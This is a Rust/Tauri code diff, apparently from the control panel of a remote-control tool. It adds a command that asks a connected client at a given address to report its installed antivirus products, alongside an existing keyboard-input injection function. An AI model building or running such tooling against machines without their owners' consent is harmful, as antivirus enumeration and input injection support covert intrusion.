@@ -12,6 +12,7 @@ use tokio::sync::mpsc::Sender;
 use crate::commands::ServerCommand;
 use crate::server::ServerWrapper;
 use crate::client::ClientWrapper;
+use std::net::SocketAddr;
 
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
@@ -820,4 +821,23 @@ pub async fn send_keyboard_input(
         .map_err(|e| e.to_string())?;
 
     Ok("Keyboard input sent".to_string())
+}
+
+#[tauri::command]
+pub async fn get_installed_avs(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
+) -> Result<String, String> {
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
+    
+    if let Ok(socket_addr) = addr.parse::<SocketAddr>() {
+        channel_tx.send(ServerCommand::GetInstalledAVs(socket_addr))
+            .await
+            .map_err(|e| format!("Failed to send GetInstalledAVs command: {}", e))?;
+        
+        Ok("Command sent".to_string())
+    } else {
+        Err(format!("Invalid address: {}", addr))
+    }
 }
